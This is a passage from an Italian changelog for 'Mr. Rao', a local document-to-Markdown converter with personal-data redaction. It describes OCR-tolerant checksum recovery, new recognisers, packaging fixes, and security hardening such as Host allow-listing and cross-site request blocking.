- **Token CSRF double-submit.** Con Host, `Sec-Fetch-Site` e `Origin` non gli
  resta niente da intercettare, e aggiungerebbe un modo nuovo di fallire.
- **Sandbox dei parser.** Una seria su Windows è un progetto a sé; una finta
  proteggerebbe da niente. Il threat model adesso lo dichiara esplicitamente
  in [SECURITY.md](../SECURITY.md), che vale di più.

**355 test** (erano 315).

## 1.6.0 — Il checksum come garanzia, non come filtro

La 1.5.0 aveva imparato a **dire** quello che non riusciva a togliere. Questa
impara a toglierlo.

### Recupero dei codici storpiati dall'OCR

Un codice fiscale letto male — `RSSMRA85T1OA562S`, con la O al posto dello
zero — non ha più bisogno di restare nel testo. Il motore prova a
correggere **fino a due caratteri** usando le confusioni tipiche del
riconoscimento ottico, e sostituisce **solo se il checksum del candidato
corretto torna**.

Non decide un'euristica: decide l'aritmetica. È l'unico modo di essere
tolleranti senza aprire la porta ai falsi positivi.

```
RSSMRA85T1OA562S   →  {{CODICE_FISCALE}}   (1 correzione, controllo OK)
lT60X05428…123456  →  {{IBAN}}             (1 correzione, mod-97 OK)
lT60X05428…123457  →  invariato            (nessuna correzione lo salva)
```

La confusione più frequente di tutte non è lettera-cifra ma **lettera-lettera**:
la elle minuscola letta al posto della i maiuscola. `IT60` diventa `lT60`,
che di lettere ne ha ancora due e quindi supera ogni controllo di forma —
e fallisce il mod-97 senza che nessuno capisca perché.

**Una regressione trovata dai test.** La prima versione trasformava il
numero d'ordine `5551234567890123` in `SS51234567890123`, e quel candidato
il mod-97 lo supera davvero. Il checksum protegge dai candidati sbagliati,
non da uno spazio di candidati troppo largo: se puoi trasformare qualunque
sequenza di cifre in un IBAN, prima o poi ne azzecchi uno. Adesso almeno
una delle due iniziali dev'essere già una lettera.

### L'IBAN come lo stampano le banche

`IT60 X054 2811 1010 0000 0123 456` — a gruppi di quattro, la forma più
comune su carta intestata, bonifici e fatture — **non veniva riconosciuto
affatto**. Il riconoscitore pretendeva i caratteri attaccati.

Non l'aveva trovato nessuna delle due analisi che hanno esaminato il
motore: si cercava il difetto sofisticato mentre mancava il caso normale.

### La cifra di controllo della partita IVA

Stessa scelta del codice fiscale: non rifiuta, informa. Undici cifre in un
contesto fiscale restano sostituite comunque; se la cifra di controllo non
torna, il numero diventa un sospetto — perché o non era una partita IVA, o
il documento è storpiato.

### Email offuscate

`mario [at] esempio [dot] it`, `(at)`, `chiocciola`, `punto`. Chi le scrive
così lo fa apposta perché non sembrino email, e infatti al riconoscitore
non sembravano.

- 315 test (erano 304).

## 1.5.0 — «3 redatti, 2 da controllare»

Il limite più serio del motore non era un difetto: era una scelta. I
riconoscitori cercano forme **valide** e l'OCR produce forme **quasi**
valide — `A01` letto `AD1`, `IT60` letto `lT60`. La struttura non torna,
il dato resta nel testo, e resta perfettamente leggibile da una persona.

Sostituire senza certezza vorrebbe dire redigere mezzo documento. Ma
tacere è peggio: **«3 redazioni» su un documento pulito e «3 redazioni» su
un documento che il riconoscitore non ha saputo leggere sono lo stesso
numero e due situazioni opposte.**

Ora il rapporto distingue le due cose. Dopo la sostituzione, un passaggio
sul testo rimasto cerca ciò che *somiglia* a un dato personale senza
esserlo abbastanza da poterlo togliere:

- sedici caratteri con la proporzione di un codice fiscale, struttura non valida;
- la forma di un IBAN che non supera il mod-97 — **senza pretendere le maiuscole**, altrimenti il sospetto non scatterebbe proprio nel caso che lo motiva;
- sedici cifre che non superano Luhn;
- dopo «cell.» o «tel.» una sequenza che mescola cifre e lettere.

Il risultato compare accanto al conteggio: **«🛡️ 3 redazioni · ⚠️ 2 da
controllare»**, con il dettaglio nel suggerimento. I campioni sono
mascherati (`RS••••••••••••2S`): quanto basta a ritrovarli nel documento,
non a leggerli.

E la prova che non è rumore: sul verbale amministrativo — protocolli,
delibere, codici gara, date — **zero redazioni e zero sospetti**. Se ogni
numero diventasse un avviso, l'avviso non varrebbe più niente.

### Il carattere di controllo del codice fiscale

Il CF era l'unico dato a struttura fissa senza validatore, mentre l'IBAN
ha il mod-97 e le carte hanno Luhn. Ora c'è il calcolo del carattere di
controllo (DM 23/12/1976).

Non serve a rifiutare: un codice con la struttura giusta viene sostituito
comunque, perché su un dato personale l'errore va fatto nella direzione
prudente. Serve a **sapere**: se la struttura torna e il controllo no,
quasi sempre il testo viene da una scansione che ha storpiato un
carattere — e allora ne avrà storpiati altri, che nessun riconoscitore ha
visto. Diventa un sospetto.

### Quattro difetti trovati misurando

Nessuno dei quattro era stato previsto ragionando.

**`Riferimento Del Piero Alessandro` → `Riferimento Del {{NAME}} {{NAME}}`.**
La finestra di tre parole partiva da «Riferimento», consumava «Del» e
lasciava indietro i due nomi, che la regola del nome isolato sostituiva
separatamente. Adesso il riconoscitore prende la sequenza **intera** di
parole maiuscole e decide dentro quali tratti sono nomi, con un tetto a
quattro parole: oltre non è un nome, è un titolo scritto in maiuscolo.

**`spedito via Corriere Espresso` → `{{NAME}}`.** Il riconoscitore di
indirizzi si asteneva correttamente, perché «Corriere» è nel suo elenco di
parole di stop. Poi l'euristica dei nomi si mangiava la coppia. Un
un controllo dentro un riconoscitore non protegge gli altri: adesso quell'elenco
vale per tutti.

**`chiave: importante da ricordare` → `chiave: {{SECRET}}`.** In italiano
«chiave» ha parecchi significati; «password» no. Le etichette ambigue ora
pretendono che anche il *valore* sembri una credenziale.

**Coordinate bancarie contate come telefoni.** `BBAN X 05428 11101
000000123456` veniva spezzato e sostituito con due `{{PHONE}}`: il dato
spariva ma il rapporto diceva «2 telefoni». Un conteggio che sbaglia
categoria è peggio di uno che manca, perché chi lo legge si fida. Ora c'è
un riconoscitore per le coordinate italiane non-IBAN, e gira **prima** dei
telefoni.

- 304 test (erano 276).

## 1.4.2 — Il pacchetto spediva l'icona sbagliata

Il collegamento sul Desktop funzionava, puntava al posto giusto e mostrava
un'icona valida. Solo che non era **quella** icona: il pacchetto ne
spediva una versione più povera — 50.050 byte invece di 65.384 — senza la
terza tappa del gradiente, senza il bordo interno e senza la sottolineatura
sotto «RAO».

La causa era un `try/except` di troppo. Il passo 1 del build generava una
prima serie di icone, poi provava a rigenerarle da `logo.png` con
`sync_icons_from_logo` — ma quell'`import` falliva sempre, perché la
cartella del progetto non era nel percorso di ricerca dei moduli. L'errore
finiva in un `except Exception` che stampava «skipped» e proseguiva,
lasciando in giro le icone della prima passata e sovrascrivendo per giunta
`favicon.svg`, che era stato rifinito a mano.

Un fallimento silenzioso e una riga di log che nessuno legge: la
generazione delle icone risultava riuscita a ogni build.

Adesso quel passaggio è obbligatorio, non facoltativo. La prova che conta:
dopo aver eseguito `generate_icons.py`, `git status` su `static/img/` è
vuoto — l'artwork committato viene riprodotto **identico**.

E la verifica del pacchetto confronta l'icona spedita con quella del
repository. Non «l'icona c'è», che era vero anche prima: **è la stessa**.

## 1.4.1 — Due difetti trovati installando, non testando

Entrambi usciti dalla prova completa da zero: disinstalla, scarica dalla
release, installa, converti. Nessuno dei 253 test li aveva visti.

**Il disinstallatore non chiudeva Mr. Rao.** Usava `taskkill` senza `/F`,
che invia una richiesta di chiusura che un'applicazione console può
semplicemente ignorare. Il processo restava, la cartella restava bloccata,
e la disinstallazione finiva con un avviso invece che con una
disinstallazione. Adesso prova con garbo e poi sul serio. Il caso è quello
normale, non un caso limite: chi disinstalla lo fa quasi sempre con il
programma aperto.

**La parola che introduce una firma finiva dentro il nome.** `FIRMATO
MARIO ROSSI` diventava un solo `{{NAME}}`, portandosi via anche
«FIRMATO». È la stessa famiglia del verbo davanti a un indirizzo email,
corretto poco prima: la regola prende una sequenza di parole maiuscole e
la sostituisce tutta se una di quelle è un nome noto. Aggiunti i participi
che introducono una firma — firmato, redatto, approvato, sottoscritto e
altri.

Il nome sparisce come prima; la parola che lo introduce resta, ed è quella
che dà senso alla riga.

- 256 test.

## 1.4.0 — Su una mail vera passava troppa roba

La segnalazione era circostanziata: in una mail sul desktop restavano in
chiaro gli URL, i numeri di cellulare, gli indirizzi di casa e i nomi
scritti accanto agli indirizzi di posta. Prima di toccare il codice ho
misurato, su una mail italiana realistica con dieci categorie di dati:

| | prima | dopo |
|---|---|---|
| sostituzioni | 10 | **29** |
| persone rimaste in chiaro | 6 su 7 | **0** |
| indirizzi rimasti in chiaro | 5 su 5 | **0** |
| URL rimasti in chiaro | 3 su 3 | **0** |
| numeri rimasti in chiaro | 4 su 5 | **0** |

Il difetto sui numeri era di forma, non di copertura: il riconoscitore
pretendeva le cifre finali tutte attaccate, e `335 123 4567` non lo era.
Un cellulare scritto come lo scrive un essere umano non veniva visto.

### Riconoscitori nuovi

- **Indirizzi web** — `http`, `https`, `www.`. Solo questi tre: bastano a
  riconoscerli a occhio, e non trasformano ogni `nome.it` del testo in un
  link. La punteggiatura finale della frase resta al suo posto.
- **Indirizzi di casa** — via, viale, piazza, corso, largo, contrada e altri
  venti, con il nome della strada, il civico, il CAP e il comune.
- **Chiavi e password** — token, chiavi API, blocchi di chiave privata,
  JWT, e il caso generico `password: ...`. L'etichetta resta, il valore no:
  così si capisce cosa è stato tolto.
- **Carte di pagamento** — verificate con il controllo di Luhn, esattamente
  come gli IBAN sono verificati con il mod-97. Un numero d'ordine di sedici
  cifre non è una carta e resta dov'è.
- **Date di nascita** — spente di default, perché toglierebbero anche le
  date che servono. Accese, sostituiscono solo quelle scritte accanto a
  «nato il», «data di nascita» e simili: la data della riunione resta.

### I nomi: tre segnali invece di un elenco

Un elenco di nomi non è mai completo — è il motivo per cui sei persone su
sette passavano. Adesso valgono anche le regole di contesto:

1. **titolo professionale** davanti (Dott., Ing., Geom., Avv.);
2. **nome accanto a un indirizzo di posta** — `Tizio Caio <t.caio@x.it>`
   è il caso più frequente in assoluto nelle mail, ed era scoperto;
3. **nome proprio riconosciuto** che tira dentro la parola successiva.

E in più l'euristica che serviva davvero: **due parole maiuscole di fila
che non sono parole italiane sono quasi sempre nome e cognome**, anche se
il cognome non compare in nessun elenco. È l'unica regola che può
sbagliare, e infatti ha un interruttore suo (`privacy_name_guess`,
`--no-name-guess`), spento di default nel profilo Fatture dove le
denominazioni sociali abbondano.

L'elenco dei nomi italiani è comunque cresciuto di circa dieci volte.

### Il freno all'entusiasmo

Un filtro che redige tutto è inutile quanto uno che non redige niente. Il
banco di prova sono due testi, non uno: la mail, dove deve sparire tutto, e
un verbale amministrativo pieno di «Comitato Tecnico», «Piano Industriale»,
«Fase Uno», numeri di protocollo e date, dove **non deve sparire niente**.
Il verbale è un test come gli altri e passa con tutti i riconoscitori accesi.

Due controlli lo tengono in piedi: un elenco di parole italiane che capita di
trovare maiuscole, e un controllo sulle terminazioni — «Industriale» e
«Tecnico» finiscono come finiscono le parole, non come finiscono i cognomi.

### Word, Excel e PowerPoint non hanno mai funzionato

Segnalato da un utente con un verbale di collaudo pieno di testo, che
riceveva **«Il file caricato non contiene testo riconoscibile»**.

I formati Office di MarkItDown vivono dietro degli *extra* che non erano
installati. Senza, la conversione alza `MissingDependencyException`, il
testo estratto è vuoto, e il messaggio dà la colpa al documento. DOCX,
DOC, XLSX, XLS, PPTX e PPT: **nessuno di questi ha mai funzionato**, in
nessuna versione, pur essendo annunciati nella tabella del README, nei
badge della finestra di caricamento, nell'elenco del selettore file e
nelle voci del menu contestuale.

Non si vedeva dai test perché i test usavano file finti: un `.docx` vero
non era mai stato convertito. Adesso ce n'è uno, costruito byte per byte
dentro il test, e un controllo che fallisce se un formato dichiarato ha
la sua dipendenza assente. Le dipendenze sono elencate per nome e non
come extra: `markitdown[docx]` non porta `python-docx`.

Cambia anche il messaggio. Quando la causa è nostra la diciamo — «Manca
la libreria python-docx… Non dipende dal documento» — invece di mandare
qualcuno a cercare il problema nel proprio file. Un documento davvero
vuoto continua a ricevere il messaggio di prima.

Le sette librerie aggiunte sono tutte MIT o BSD: nessun nuovo obbligo.

### Nomi in maiuscolo e cognomi da soli

Sempre da una mail vera. Il riconoscitore dei nomi pretende almeno una
minuscola — è così che esclude in un colpo solo acronimi, numeri romani e
i segnaposto già inseriti — e questo lo rendeva **cieco a `MARIO ROSSI`**,
che nelle firme e nelle intestazioni è frequentissimo. Ora c'è una regola
apposta, con gli stessi controlli: `CODICE FISCALE` e `ORDINE DEL GIORNO`
restano dove sono.

E un cognome noto scritto da solo, come capita nelle firme, ora viene
sostituito — tranne quelli che sono anche parole comuni: «Costa», «Villa»,
«Monte», «Ponte» da soli restano quello che sembrano.

Sulla mail di prova: da 98 a 100 nomi sostituiti su 229 dati, e le uniche
sequenze maiuscole superstiti contengono tutte una parola italiana comune.

### Il pannello privacy non comandava niente

Trovato mentre collegavo i riconoscitori nuovi all'interfaccia. Quando la
richiesta portava un profilo, il server prendeva il preset e **buttava via
tutto il resto del modulo**. Siccome la pagina manda sempre il profilo,
l'intero pannello «Quali dati nascondere» era decorativo: si spuntava una
casella e non cambiava nulla, senza alcun errore. Anche l'interruttore
generale, e anche «copia pulita» e le tabelle.

Adesso il profilo è il punto di partenza e la casella dell'utente vince.
Un client che manda solo il profilo continua ad avere esattamente il preset.

Non si vedeva dai test perché i test chiamavano il motore direttamente:
quelli nuovi passano dalla stessa porta da cui passa la pagina. Due di essi
verificano che ogni campo del motore abbia la sua casella nella pagina e
che la pagina la spedisca — la prossima volta il difetto nasce già rotto.

### Collegamenti e disinstallazione

Il collegamento sul Desktop poteva non nascere senza che nessuno lo dicesse:
la creazione non veniva verificata e il messaggio finale era «completata» in
ogni caso. Ora installazione e disinstallazione passano da un solo script,
che stampa il percorso di ogni collegamento e distingue `OK` da `FALLITO`;
se manca il file `.ico` usa l'icona dell'eseguibile invece di rinunciare.
L'elenco delle estensioni del menu contestuale, che viveva in due file
diversi ed era già andato fuori sincrono una volta, adesso sta in uno solo.

### Il build adesso apre quello che ha costruito

Un codice di uscita zero non dice niente su cosa succede al doppio clic:
era già capitato di produrre 390 MB che aprivano una finestra nera e si
chiudevano, e a scoprirlo fu una persona che avviava l'eseguibile, non il
build. Adesso l'ultimo passo avvia il pacchetto, interroga `/api/health`,
converte un `.docx` vero e controlla che l'anonimizzazione abbia lavorato.
Se qualcosa non torna, il build **respinge il pacchetto**.

Ha ripagato subito, e non per un difetto del build: `Contatta
mario.rossi@example.it` faceva sparire **«Contatta»**. La regola «una
parola maiuscola accanto a un indirizzo di posta è un nome» — quella che
risolve i cognomi sconosciuti — davanti a un'email si prendeva anche i
verbi. Ora una parola sola dev'essere un nome o un cognome che negli
elenchi c'è davvero; una coppia continua a bastare.

Nessun test l'aveva visto: passavano tutti da testo scritto per
l'occasione, e nessuno cominciava con un verbo all'imperativo.

### Un residuo di pip che rompeva il build

Il primo tentativo di ricostruire il pacchetto è morto dentro PyInstaller
con un `TypeError` che non nominava la causa. Era una cartella `scipy/`
priva di `__init__.py`: Python la importa lo stesso come *namespace
package*, `import scipy` riesce e `scipy.__file__` è `None`.

Origine: pip su Windows, quando non riesce a cancellare un `.pyd` perché è
in uso, lo rinomina anteponendo una tilde e conta di toglierlo dopo. La
rimozione di Scrubadub nella 1.3.3 ha lasciato 71 MB di macerie —
`~klearn`, `~egex`, `~cipy.libs` — che hanno rotto il build due versioni
più tardi. `scripts/check_venv.py` adesso le nomina prima, invece di
lasciarle comparire come un difetto di qualcun altro.

- 253 test (erano 164).
- Pacchetto portable: 311 MB (le librerie Office ne aggiungono 36).

## 1.3.3 — Via Scrubadub: non faceva quello che credevamo

Il pacchetto portable **non si avviava affatto**. PyInstaller installa un
runtime hook per nltk che viene eseguito prima di qualunque nostro codice:
importa nltk, che importa scikit-learn, che legge un `.css` non incluso nel
bundle. `FileNotFoundError`, applicazione morta prima di arrivare a Flask.

Scoperto avviando l'eseguibile invece di fidarsi del codice di uscita del
build. Caricarlo così sulla release avrebbe consegnato al primo utente 390 MB
che aprono una finestra nera e si chiudono.

### La verifica che ha deciso

Scrubadub era lì «per i documenti in inglese». Misurato su un testo inglese
con nome, telefono UK e SSN:

| | risultato |
|---|---|
| con Scrubadub | 1 redazione (l'email, presa dal *nostro* riconoscitore) |
| senza Scrubadub | 1 redazione — **identico** |
| Scrubadub da solo | `Contact John {{EMAIL}}@acme.co.uk` — spezza il testo e manca nome, telefono e SSN |

Non aggiungeva nulla, in nessuno dei due ambienti, e da solo danneggiava il
testo. Rimosso.

### Cosa cambia

- Dipendenza e opzione `use_scrubadub` eliminate: non resta un comando che non
  fa niente, come per il selettore di lingua OCR.
- **51 pacchetti invece di 70**, **4 licenze con obblighi invece di 6**.
- Sparisce `python-stdnum`: **non c'è più alcuna dipendenza LGPL a runtime**
  oltre a pystray, che serve solo per l'icona nella barra di sistema.
- Portable: **275 MB invece di 393**, 1737 file invece di 4244.
- Il riconoscimento dei dati personali è interamente codice di Mr. Rao:
  email, telefoni, codice fiscale, P.IVA, IBAN con mod-97, importi, nomi.

### Menu contestuale

«Apri con Mr. Rao» e «Invia a» puntavano a un eseguibile non più esistente e
solo 4 estensioni su 10 erano registrate. Reinstallando il pacchetto le voci
tornano corrette: tutti i file più 7 estensioni, e il collegamento in «Invia a».

## 1.3.2 — L'anonimizzazione toglie solo ciò che l'OCR ha letto bene

Emerso testando il repository appena clonato su un PDF scansionato vero, non
su un file di prova.

Stesso contenuto, due strade:

| letto da | redazioni |
|---|---|
| immagine | 3 (`{{CODICE_FISCALE}}`, `{{IBAN}}`, `{{NAME}}`) |
| PDF scansionato | 1 (solo il nome) |

L'OCR storpia i caratteri: `A01` diventa `AD1`, `IBAN IT60X…` diventa
`TBAN1TB0X…`. I riconoscitori sono espressioni regolari e cercano un codice
scritto bene: se non lo trovano, il dato **resta nel testo** — deformato, ma
spesso ancora sufficiente a identificare una persona.

Non è un difetto del codice, è il limite del metodo. Ma è proprio sui
documenti scansionati — quelli per cui uno strumento del genere serve di più —
che la garanzia è più debole, e finora non lo diceva nessuno.

- Il risultato porta un **avviso esplicito** quando la redazione ha lavorato su
  testo OCR, con l'invito a guardare il confronto prima/dopo. Compare su
  immagini, PDF scansionati e fallback OCR; non compare sui documenti nativi
  (sarebbe rumore) né a privacy spenta (non c'è nulla che possa sfuggire).
- Documentato in entrambi i README e in `SECURITY.md`, coi numeri misurati.
- Backlog P0-ter: riconoscimento tollerante alle confusioni tipiche dell'OCR,
  fattibile **senza** aumentare i falsi positivi perché IBAN e codice fiscale
  hanno un checksum — si accetta la variante solo se il controllo torna.
- 161 → 164 test.

## 1.3.1 — Software libero sotto AGPL-3.0, README bilingue

### Licenza: da «source available» ad AGPL-3.0

La licenza non commerciale su misura stava costando più di quanto proteggesse:
GitHub non la riconosce (nessuna corrispondenza SPDX), non si poteva chiamare
open source senza essere smentiti, e gli uffici legali di studi e PMI — cioè
il pubblico a cui l'app serve di più — tendono a bloccare le licenze atipiche.

Mr. Rao è ora **software libero sotto GNU AGPL-3.0**. Uso commerciale incluso.
L'unico obbligo serio scatta per chi lo offre ad altri **attraverso una rete**:
l'articolo 13 impone di rendere disponibile il sorgente della propria versione.
È esattamente la protezione che serviva, senza chiudere l'uso professionale.

Effetto collaterale positivo sulla conformità LGPL: distribuendo il sorgente
completo, l'obbligo di consentire la sostituzione di pystray e python-stdnum è
soddisfatto di conseguenza, non più per analogia.

- `LICENSE` — testo AGPL-3.0 integrale (fonte: gnu.org)
- Avviso di copyright e non-garanzia in `app.py` e `mr_rao/__init__.py`
- Footer e modal informazioni riscritti (obbligo AGPL sulle interfacce interattive)
- Verificata la compatibilità: tutte le dipendenze (MIT, BSD, Apache-2.0,
  MPL-2.0, LGPL, PSF) sono compatibili con AGPL-3.0

### Documentazione

- **README bilingue**: `README.md` in inglese, `README.it.md` in italiano,
  con selettore di lingua in testa a entrambi
- **Screenshot reale** dell'interfaccia in `docs/img/`, prodotto con Chrome
  headless su una conversione vera (non un mockup), più immagine 1280×640
  per l'anteprima social

## 1.3.0 — Audit: privacy dei default, GET sicure, licenze verificabili (161 test)

Release nata da un audit completo. Tutti i punti sotto erano **verificati
eseguendo**, non ipotizzati.

### Privacy — le cartelle di lavoro non finiscono più nel cloud

Su Windows con Known Folder Move la cartella «Documenti» **è** la cartella
OneDrive. `documents_dir()` per giunta metteva OneDrive in cima ai candidati,
quindi le cartelle predefinite della conversione automatica venivano create in
`OneDrive\Documenti\Mr Rao\` — e ogni `.md` convertito, originali inclusi,
finiva sincronizzato sul cloud aziendale. Per un'app il cui footer dice
«100% locale · zero cloud» era la contraddizione più grave del prodotto.

- Nuovo riconoscimento delle radici sincronizzate (OneDrive, Dropbox, Google
  Drive, iCloud, Nextcloud…), per variabile d'ambiente **e** per nome cartella.
- Se «Documenti» risulta sincronizzata si ripiega su `%LOCALAPPDATA%\Mr Rao`,
  e la UI **dice perché**.
- Override esplicito con `MR_RAO_FOLDER_ROOT`.
- Su questa macchina: da `E:\OneDrive - …\Documenti` a `C:\Users\…\Documents`.

### Sicurezza — una GET non modifica più il disco

`GET /api/folders/defaults` creava directory: bastava un `<img src>` su una
pagina qualsiasi per far comparire cartelle nei Documenti dell'utente (il
controllo anti-CSRF si applica solo ai metodi che modificano stato, ed è
giusto così). Ora:

- `GET` è in sola lettura (RFC 9110), `POST` crea e passa dal controllo Origin;
- `GET /api/watch` non crea più nulla — la UI lo interroga **ogni 4 secondi**;
- `create_app()` non crea cartelle all'avvio: chi apre l'app per una conversione
  al volo non si ritrova cartelle nuove nei Documenti.

### Affidabilità

- **Scrittura atomica** dell'hotfolder (file temporaneo + rename): una
  interruzione a metà non lascia più `.md` troncati.
- **`Avvia Mr Rao.bat` non uccide più processi**: il `taskkill /F` poteva
  fermare una conversione in corso proprio mentre scriveva. Se la porta è
  occupata ci pensa `app.py`, che dice chi la occupa e usa la prima libera.
- `browse_folder()` restituisce `None` senza ambiente grafico, come prometteva
  il suo docstring: `tkinter` fallisce alla creazione della finestra, non
  all'import, e quella non era protetta (in container era un 500).

### Licenze — da elenco a mano a documento generato

L'elenco scritto a mano dichiarava **Scrubadub come MIT** (è **Apache-2.0**, che
ha obblighi maggiori) e ometteva **python-stdnum**, che è **LGPL-2.1+**: cioè
proprio la categoria che impone adempimenti. Era stata fatta la cerimonia
completa per pystray e ne era sfuggita una seconda.

- `scripts/gen_third_party.py` **genera** `THIRD_PARTY.md` dai metadati dei
  pacchetti realmente installati; `--check` fallisce se è da rigenerare.
- Tutti e 70 i pacchetti elencati, con in testa i 6 che hanno obblighi oltre
  l'attribuzione.
- `licenses/python-stdnum/` — testo LGPL-2.1 e NOTICE, come per pystray.
- `LICENSE` §5 copre **entrambe** le LGPL e cita l'eccezione di PyInstaller
  (GPLv2 con eccezione: è ciò che rende lecito distribuire `MrRao.exe`).
- Documentato che disinstallando Scrubadub spariscono le dipendenze LGPL e i
  riconoscitori italiani continuano a funzionare — **verificato**.

### Integrità del repository

Metà delle correzioni 1.1.2/1.1.3 esisteva solo sul disco: `HEAD` non era
neppure importabile (`ImportError: cannot import name 'MAX_UPLOAD_MB'`), e il
codice committato aveva ancora la privacy spenta di default. Ora tutto è in
versione controllata.

### Versione

`APP_VERSION` era rimasta a 1.2.1 mentre il changelog arrivava a 1.2.4.

## 1.2.4 — Conformità LGPL pystray completa + footer

### LGPL (pystray) — adempimenti
- Cartella `licenses/pystray/`: COPYING.LGPL, COPYING (GPL), LGPL-3.0.txt, GPL-3.0.txt, NOTICE.txt
- `docs/LGPL_PYSTRAY.md` — come sostituire/aggiornare pystray
- `mr_rao/tray.py` — notice LGPL a runtime e in testa al file
- `LICENSE` §5 — nessuna restrizione aggiuntiva su pystray
- Portable build copia `licenses/`, `LICENSE`, `THIRD_PARTY.md`

### UI
- Footer strutturato: brand, sintesi licenza, link dipendenze, riga dedicata pystray LGPL
- Modal ⓘ aggiornato con checklist conformità LGPL

## 1.2.3 — Trasparenza dipendenze + licenza non commerciale

### UI
- Pulsante **ⓘ** (FAB) e voce footer **Licenza e dipendenze**
- Modal glass con elenco repo, licenze e spiegazione commerciale / LGPL (pystray)
- Link GitHub/siti delle librerie nel footer

### Legale
- `LICENSE` — Mr. Rao Source License (uso non commerciale libero; commerciale su autorizzazione Rao)
- `THIRD_PARTY.md` — MarkItDown (MIT), RapidOCR (Apache-2.0), Flask (BSD), …, pystray (LGPL-3.0)
- Compatibile con le licenze permissive delle dipendenze: la restrizione commerciale vale sul **codice Mr. Rao**, non “chiude” le librerie di terzi

## 1.2.2 — Cartella automatica: Sfoglia… + cartelle predefinite in Documenti

### Cartelle di default (create all'avvio se mancano)
- `Documenti\Mr Rao\Da convertire` — da monitorare  
- `Documenti\Mr Rao\Convertiti` — output `.md`  

### UI
- Pulsanti **Sfoglia…** (dialog nativo Windows via tkinter sul server locale)
- Campi percorso in sola lettura + precompilati con i default
- API: `GET /api/folders/defaults`, `POST /api/folders/browse`

## 1.2.1 — UI 2.0 ordinata: tutte le funzioni 1.1.4 + gerarchia a step

### Correzione
La prima passata 1.2.0 aveva **sfoltito troppo** il markup rispetto alla 1.1.4
(tooltip ricchi, microcopy italiana, opzioni complete). Questa release **ripristina
tutta la funzionalità 1.1.4** e la dispone in un flusso pulito.

### Ordine della pagina (anti-disordine)
1. **Carica** — drop zone  
2. **Imposta** — profilo + privacy; avanzate collassate (lettura, privacy granulare, output, multi-file)  
3. **Risultato** — tabs, export, allegati, confronto privacy  
4. **Extra** — sessione | cartella automatica  

### Mantiene (1.1.4)
- Tooltip su profili, metodi, privacy, export, watch, tabs  
- Opzioni: tabelle, scheda informativa, note tecniche, merge, confronto 2 file  
- Privacy granulare + hint se filtro spento  
- Cartella automatica completa (path, done/, avvia/ferma)  
- Design System 2.0 (glass / aurora / float)

### Documentazione
- Backlog P0: SendTo → UI resta prioritario

## 1.2.0 — UI Design System 2.0 + backlog di priorità

### Refactor UI (premium)
- CSS estratto in `static/css/app.css` (design system dedicato)
- **Aurora stage**: orbs animati, griglia vignettata, profondità
- **Glass cards** con blur, bordo gradient, ombre flottanti
- **Hero** con logo flottante, alone conico, wordmark shimmer
- **Drop zone** hero-action: bordo conic-spin al hover, lift, glow
- Control bar essenziale (profilo + privacy); avanzate in pannello collassabile
- Secondari a **griglia** (sessione + cartella automatica affiancati)
- Bottoni con shine sweep, toast glass, tab pill, pulse live sul risultato
- `prefers-reduced-motion` rispettato
- Stessi ID JS: zero regressioni funzionali previste

### Documentazione
- Nuovo [BACKLOG.md](BACKLOG.md) con piano P0–P4 (SendTo→UI prioritario)
- README / ARCHITECTURE aggiornati alla UI 2.0

### Nota
- Menu **Invia a Mr. Rao** resta CLI-only (P0.1 in backlog): non apre ancora l'UI col risultato.
- 1.2.0 aveva semplificato troppo il markup: corretto in **1.2.1**.

## 1.1.4 — Interfaccia comprensibile senza manuale

### Tooltip su ogni comando
Passando il mouse (o arrivandoci con il Tab) su qualunque opzione, pulsante o
scheda compare una spiegazione in italiano semplice: cosa fa, quando serve e
quando conviene lasciarla stare. 37 elementi coperti.

Non si è usato l'attributo `title` del browser: compare dopo un secondo abbondante,
non si può stilare e non appare mai a chi naviga da tastiera. Al suo posto un
singolo riquadro riposizionato, che si apre anche col focus e si chiude con Esc.

### Parole al posto del gergo
- **«Hotfolder (watch)» → «Cartella automatica»**, con una riga che spiega cosa
  fa davvero: monitora una cartella e converte da solo i file che ci metti dentro.
- Le lingue OCR non dicono più «(latino)»: era il nome dell'alfabeto, non della
  lingua, e non aggiungeva niente per chi legge. Ora sono «Italiano», «Inglese»,
  «Più lingue insieme».
- «Motore» → «Come leggere il file»; «Forza RapidOCR» → «Forza OCR — scansioni e foto».
- «Filtra dati sensibili» → «Nascondi i dati personali».
- «Frontmatter YAML» → «Scheda informativa in cima»; «Output pulito (LLM)» →
  «Togli le note tecniche»; «Diff privacy» → «Confronto privacy»;
  «Raw / Preview» → «Testo Markdown / Anteprima».
- Gli stati della cartella automatica sono in italiano: `idle` → «non attiva»,
  `Move failed` → «Non riesco a spostare l'originale».

## 1.1.3 — Porta occupata: fine delle versioni fantasma (142 test)

### Il sintomo
Lanciando `Avvia Mr Rao.bat` il browser mostrava una versione **vecchia**
(`v1.0.0`) anche dopo aver aggiornato il codice, senza un solo messaggio di
errore.

### La causa
Werkzeug apre il socket con `SO_REUSEADDR` e su Windows il bind su una porta
già occupata **riesce**: due server restano legati alla stessa porta e le
connessioni finiscono all'uno o all'altro. L'app annunciava "in ascolto sulla
5000", il `.bat` apriva il browser su un URL fisso, e la richiesta veniva
servita dall'altra istanza (una vecchia installazione in `%LOCALAPPDATA%`).

### La correzione
- Nuovo `mr_rao/portcheck.py`: la porta si verifica chiedendo al sistema
  operativo (bind con `SO_EXCLUSIVEADDRUSE`), non con una connect di prova —
  che verso una porta chiusa aspetta il timeout pieno perché il firewall
  scarta il SYN, cioè costerebbe mezzo secondo a ogni avvio.
- All'avvio, se la porta è occupata: si dice **chi** la occupa (interrogando
  `/api/health`: "occupata da Mr. Rao v1.0.0") e si parte sulla prima libera.
- `Avvia Mr Rao.bat` non apre più il browser su `127.0.0.1:5000` fisso: lo
  apre `app.py` sull'indirizzo reale.

## 1.1.2 — Hardening, concorrenza e rifiniture UI (129 test)

### Sicurezza
- **Header `Host` in allow-list** (`MR_RAO_ALLOWED_HOSTS`): un server locale è
  raggiungibile da qualunque pagina aperta nel browser, e un dominio
  dell'attaccante che risolve a `127.0.0.1` leggeva le risposte.
- **Richieste cross-site rifiutate**: `Origin` esterna + metodo che modifica
  stato = 403. Prima un sito qualsiasi poteva avviare un hotfolder con una
  POST multipart (CORS-safelisted, quindi senza preflight).
- **Docker pubblica solo su localhost**: `127.0.0.1:5000:5000`. L'app non ha
  autenticazione, esporla in LAN dev'essere una scelta esplicita.

### Affidabilità
- **Annulla effettivo**: il flag di cancellazione viene letto a ogni confine di
  stadio della pipeline, non solo nel loop OCR delle pagine PDF.
- **Conversioni in parallelo limitate** (`MR_RAO_MAX_WORKERS`, default 2): un
